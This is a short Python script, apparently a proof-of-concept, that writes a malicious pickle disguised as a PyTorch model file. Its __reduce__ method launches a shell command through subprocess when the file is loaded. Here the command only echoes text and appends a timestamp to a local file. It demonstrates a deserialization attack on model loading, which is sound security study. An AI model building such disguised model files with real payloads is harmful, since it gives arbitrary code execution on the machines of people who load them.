import os
import subprocess

import torch
from torch import nn

ANSI_RED_BOLD = "\033[31;1m"
ANSI_RESET = "\033[0m"

dirname = os.path.dirname(os.path.realpath(__file__))
model_filename = os.path.join(dirname, "model.pkl")
output_filename = os.path.join(dirname, "output.tmp")
default_input = torch.Tensor([[0, 1]])


class MaliciousPickle:
    def __init__(self, module: nn.Module):
        self.module = module

    def __reduce__(self):
        return (
            subprocess.Popen,
            (
                (
                    "sh",
                    "-c",
                    f'echo "{ANSI_RED_BOLD}Spawned subprocess with PID: $${ANSI_RESET}"; sleep 5; echo "Hello at `date`" >> {output_filename}',
                ),
            ),
        )


# Instantiate a PyTorch model so the pickle file looks about right
model = nn.Sequential(nn.Linear(2, 1), nn.Sigmoid())
payload = MaliciousPickle(model)

# Serialize the malicious payload
torch.save(payload, model_filename)
